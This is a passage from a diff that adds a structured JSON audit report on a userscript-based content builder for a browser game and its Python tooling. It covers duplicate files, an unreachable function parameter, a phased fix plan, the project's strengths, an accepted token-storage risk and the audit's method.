+            ["45g_DATA_checks.json", "skills/building-tnr-content/data/45g_DATA_checks.json"],
+            ["32b_DATA_pool.json", "skills/building-tnr-content/data/32b_DATA_pool.json"]
+          ],
+          "note": "skillpack.yml copies these to root on every skills push and the README documents the arrangement. The builder fetches the root copies at panel load."
+        },
+        {
+          "id": "stale-staging",
+          "verdict": "delete",
+          "paths": [
+            [".github/workflows/relay.yml", "state/staged_workflows/relay.yml"],
+            [".github/workflows/scrub.yml", "state/staged_workflows/scrub.yml"],
+            [".github/workflows/skillpack.yml", "state/staged_workflows/skillpack.yml"],
+            [".github/workflows/regen_schemas.yml", "state/staged_workflows/regen_schemas.yml"]
+          ],
+          "note": "Byte-identical. These staged copies existed so the workflows could be installed by hand through the web UI, which has happened. Nothing checks them now, so the next workflow edit silently forks them. Since workflow edits must go through the web UI, a stale staging copy is actively misleading about what is installed."
+        },
+        {
+          "id": "unsynced-art",
+          "verdict": "add a sync step or delete one copy",
+          "paths": [
+            ["pack/icon_rank_A.webp", "skills/producing-tnr-art/data/rank_icons/icon_rank_A.webp"],
+            ["pack/icon_rank_B.webp", "skills/producing-tnr-art/data/rank_icons/icon_rank_B.webp"],
+            ["pack/icon_rank_C.webp", "skills/producing-tnr-art/data/rank_icons/icon_rank_C.webp"],
+            ["pack/icon_rank_D.webp", "skills/producing-tnr-art/data/rank_icons/icon_rank_D.webp"]
+          ],
+          "note": "Byte-identical with no copy step anywhere in the workflows. Determine which is canonical before removing either."
+        },
+        {
+          "id": "forked-script",
+          "verdict": "collapse behind a flag",
+          "paths": [
+            ["skills/building-tnr-content/scripts/selfcheck.py", "skills/building-tnr-content/scripts/selfcheck_for_bundle.py"]
+          ],
+          "note": "Not byte-identical, which is why it does not appear in the hash survey. diff shows a single hunk: selfcheck_for_bundle.py omits line 85, 'errs.extend(check_idswithnumber_recovered())', and the blank line after it. Otherwise identical. Every future fix must be applied twice.",
+          "diff": "85,86d84\n<     errs.extend(check_idswithnumber_recovered())\n< "
+        }
+      ],
+      "verify": {
+        "command": "git ls-files -z | xargs -0 sha1sum | sort | awk '{print $1}' | uniq -d | wc -l",
+        "observed": "12 duplicate blob hashes, covering the first three groups. The selfcheck fork is not included because the files differ by two lines."
+      },
+      "fix": {
+        "summary": "Delete state/staged_workflows/, resolve pack/ to one canonical copy, collapse the selfcheck fork.",
+        "steps": [
+          "git rm -r state/staged_workflows/ and note in the commit that the workflows are installed.",
+          "For pack/: determine which copy is canonical, then either add a copy step to skillpack.yml or remove the redundant one.",
+          "For selfcheck: merge the fork into selfcheck.py behind a flag, e.g. --skip-idswithnumber or --bundle, and delete selfcheck_for_bundle.py after updating its callers."
+        ],
+        "acceptance": "The duplicate-blob survey returns only the three machine-synced pairs. selfcheck_for_bundle.py no longer exists and its callers pass the flag.",
+        "effort": "small",
+        "risk": "low",
+        "caution": "Find callers of selfcheck_for_bundle.py before deleting it. It may be referenced by archived or bundle-era tooling."
+      },
+      "depends_on": [],
+      "related": []
+    },
+
+    {
+      "id": "TNR-12",
+      "title": "build(sub) is unreachable and the trailing loops iterate a different collection",
+      "severity": "low",
+      "status": "latent",
+      "confidence": "static-analysis",
+      "subsystem": "builder_bundle.js",
+      "locations": [
+        { "file": "builder_bundle.js", "line": 713, "match": "const build=async sub=>{const L=sub||rows;", "role": "the dead parameter" },
+        { "file": "builder_bundle.js", "line": 793, "match": "build()", "role": "call site 1" },
+        { "file": "builder_bundle.js", "line": 860, "match": "build()", "role": "call site 2" },
+        { "file": "builder_bundle.js", "line": 877, "match": "build()", "role": "call site 3" }
+      ],
+      "problem": "All three call sites invoke build() with no argument, so sub is always undefined, L === rows always holds, and every !sub branch is dead. Meanwhile the read-back loop, the postflight tally and the results-bundle serializer all iterate 'rows' rather than 'L'.",
+      "why_it_matters": "Harmless at this SHA because the two collections are the same array. The first time sub is actually passed, the push covers the subset while verification and the committed evidence bundle cover everything, and the divergence will be silent. This is the same failure shape as TNR-01: a scope condition that is correct only because the guarding flag is never set.",
+      "context": "The parameter is not needed. Batch mode runs whole files through parse() then build(); Retry failed relies on the idmap to skip completed creates rather than on a subset.",
+      "evidence": [
+        {
+          "kind": "command_output",
+          "command": "grep -no 'build([a-zA-Z]*)' builder_bundle.js",
+          "output": "793:build()\n860:build()\n877:build()"
+        }
+      ],
+      "verify": {
+        "command": "grep -n 'const build=async' builder_bundle.js && grep -no 'build([a-zA-Z]*)' builder_bundle.js",
+        "observed": "One definition taking sub; three call sites, none passing an argument."
+      },
+      "fix": {
+        "summary": "Pick one. Either remove the parameter or make the trailing loops honor it.",
+        "options": [
+          { "id": "remove", "recommended": true, "detail": "Drop the sub parameter, replace L with rows throughout build(), and delete the !sub branches. Smallest diff, removes the trap." },
+          { "id": "commit", "recommended": false, "detail": "Keep sub and change the read-back loop, the postflight tally and the bundle serializer to iterate L. Larger diff, and the results bundle then covers only the subset, which changes what the evidence trail means." }
+        ],
+        "acceptance": "Either no function in the bundle takes an unused parameter, or every loop inside build() iterates the same collection.",
+        "effort": "small",
+        "risk": "low",
+        "note": "Do not leave it half-supported; that is the one state that fails silently later."
+      },
+      "depends_on": [],
+      "related": ["TNR-01"]
+    }
+  ],
+
+  "execution_plan": {
+    "rationale": "Ordered by ratio of consequence to diff size, with independence noted so an agent can parallelize or stop early.",
+    "batches": [
+      {
+        "batch": 1,
+        "label": "Live symptoms and the injection, three small independent diffs",
+        "findings": ["TNR-01", "TNR-02", "TNR-05"],
+        "parallelizable": true,
+        "note": "TNR-01 and TNR-02 touch builder_bundle.js and can be one commit. TNR-05 edits a workflow file and must be installed through the web UI."
+      },
+      {
+        "batch": 2,
+        "label": "Stop the repo growth",
+        "findings": ["TNR-08"],
+        "parallelizable": false,
+        "note": "Only step 1 of the fix, the zip exclusions. Defer the history question to an explicit owner decision."
+      },
+      {
+        "batch": 3,
+        "label": "Close the CI and scan coverage gaps",
+        "findings": ["TNR-03", "TNR-09", "TNR-06"],
+        "parallelizable": false,
+        "note": "TNR-03 and TNR-09 both add steps to skillpack.yml, so do them as one workflow edit. TNR-06 adds a separate scheduled history-sweep job. Group all three into the single web-UI workflow-install session, since that install is manual and should not be repeated more often than necessary. TNR-03 also requires a contract regeneration that may surface real upstream drift."
+      },
+      {
+        "batch": 4,
+        "label": "Latent correctness and hygiene",
+        "findings": ["TNR-04", "TNR-07", "TNR-10", "TNR-11", "TNR-12"],
+        "parallelizable": true
+      }
+    ]
+  },
+
+  "strengths": [
+    { "id": "doctrine-gates", "detail": "doctrinemap.py, render_doctrine.py --check and build_packs.py --check all exit 0 at this SHA. Fail-closed projection checks, where a drifted rendering breaks the build rather than shipping stale, are the correct pattern. TNR-03 argues for extending this, not replacing it." },
+    { "id": "changelog-discipline", "detail": "The bundle header records root causes with incident references, not just fixes. The v4.23 entry traces nine unclearable quest fields back to wsNorm; v4.30 narrows isLim after record prose containing 'too many' wedged a read. This is why TNR-01 was findable." },
+    { "id": "validator-structure", "detail": "validate.py is 1181 lines with single-purpose functions and engine laws cited by number at each check site. Maintainable at twice the size." },
+    { "id": "python-hygiene", "detail": "An AST sweep across all 62 Python files found zero mutable default arguments, zero bare 'except:', and zero identity comparisons against non-singleton literals." },
+    { "id": "bounded-loops", "detail": "Every rate-limited path caps at 8 tries with capped exponential backoff to 60s. pageAll carries a hard 2000-page ceiling. No unbounded loop against the game API." }
+  ],
+
+  "out_of_scope": {
+    "not_examined": [
+      "Content correctness of the manifests under push/",
+      "The engine laws themselves in docs/ENGINE_LAWS.md",
+      "archive/bundle-era-2026-08-30/scripts/, retired and STALE-bannered",
+      "The 23 generated push/*.gen.py one-offs, which are outputs rather than maintained source",
+      "Runtime behavior against the live game API, which was never contacted"
+    ],
+    "accepted_risks": [
+      {
+        "id": "localstorage-pat",
+        "detail": "The fine-grained PAT is stored in localStorage under key 'tnr_bk_gh_v1' on the theninja-rpg.com origin, readable by any script on that page including other userscripts and any XSS. The bundle header documents this explicitly. Scope (contents-write on one public repo) and token expiry are the mitigations and are already the design. Listed so its absence from the findings is not read as an oversight.",
+        "action": "none, unless the threat model changes"
+      }
+    ]
+  },
+
+  "audit_method": {
+    "read_in_full": [
+      "builder_bundle.js (885 lines)",
+      "builder_loader_user.js",
+      "all 6 files in .github/workflows/",
+      ".github/scripts/build_answers.py",
+      "structural survey of every script under skills/"
+    ],
+    "executed": [
+      "python3 skills/building-tnr-content/scripts/doctrinemap.py",
+      "python3 skills/building-tnr-content/scripts/render_doctrine.py --check",
+      "python3 skills/building-tnr-content/scripts/build_packs.py --check",
+      "python3 skills/building-tnr-content/scripts/selfcheck.py (from repo root and from data dir)",
+      "python3 skills/producing-tnr-art/scripts/artpreflight_selftest.py",
+      "AST sweep over all 62 Python files for mutable defaults, bare except, and is-literal comparisons",
+      "git blob size survey over --all",
+      "zip member composition survey",
+      "targeted probes for TNR-01, TNR-02, TNR-04, TNR-08, TNR-09"
+    ],
+    "not_executed": [
+      "No fix was applied. The working tree at this SHA is unmodified.",
+      "No push, no PR, no commit was made by this audit."
+    ]
+  }
+}
